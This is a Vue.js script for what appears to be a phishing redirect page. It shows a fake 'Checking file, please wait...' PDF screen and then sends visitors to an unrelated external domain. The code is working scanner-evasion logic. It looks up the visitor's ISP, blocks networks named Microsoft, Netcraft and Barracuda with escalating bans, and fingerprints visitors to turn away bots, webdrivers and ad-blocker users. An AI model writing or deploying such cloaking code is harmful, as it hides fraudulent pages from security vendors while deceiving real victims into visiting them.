import { createApp, ref, onMounted } from 'vue';
import { detect } from 'detect-browser';
import FingerprintJS from '@fingerprintjs/fingerprintjs';
import axios from 'axios';
import '@/assets/style.css';  // ✅ Correct way to load CSS

const app = createApp({
  setup() {
    const loading = ref(true);
    const isBot = ref(false);
    const isBlocked = ref(false);
    const visitorIP = ref('');

    const checkVisitorReputation = async () => {
      const browser = detect();
      const fp = await FingerprintJS.load();
      const result = await fp.get();

      try {
        const ipInfo = await axios.get('https://ipapi.co/json/');
        visitorIP.value = ipInfo.data.ip;
        const isp = ipInfo.data.org.toLowerCase();

        const blockedISPs = ["microsoft", "netcraft", "barracuda"];
        const penaltyKey = `penalty_${visitorIP.value}`;
        const penaltyData = JSON.parse(localStorage.getItem(penaltyKey)) || { count: 0, expiry: null };
        const now = new Date().getTime();

        if (blockedISPs.some(blockedISP => isp.includes(blockedISP))) {
          if (penaltyData.expiry && now < penaltyData.expiry) {
            isBlocked.value = true;
            return;
          }

          penaltyData.count += 1;
          penaltyData.expiry = penaltyData.count === 1 ? now + 60 * 60 * 1000 :
                               penaltyData.count === 2 ? now + 24 * 60 * 60 * 1000 :
                                                         now + 365 * 24 * 60 * 60 * 1000;
          localStorage.setItem(penaltyKey, JSON.stringify(penaltyData));
          isBlocked.value = true;
          return;
        }

        if (browser?.name === 'bot' || result.components?.adBlock?.value || result.components?.webdriver?.value) {
          isBot.value = true;
        }
      } catch (error) {
        console.error('Error fetching IP info:', error);
      }
    };

    onMounted(async () => {
      await checkVisitorReputation();

      if (isBot.value || isBlocked.value) {
        document.body.innerHTML = '<h1>Access Denied</h1>';
      } else {
        setTimeout(() => {
          window.location.href = 'https://tk.altinbasaknevresim.com.tr';
        }, 3000);
      }
    });

    return { loading, isBot, isBlocked };
  },

  template: `
    <div v-if="!isBot && !isBlocked">
      <div v-if="loading" class="loading-container">
        <img src="/pdf-logo.png" alt="PDF Logo" class="pdf-logo" />
        <p class="loading-text">Checking file, please wait...</p>
      </div>
    </div>
  `,
});

app.mount('#app');
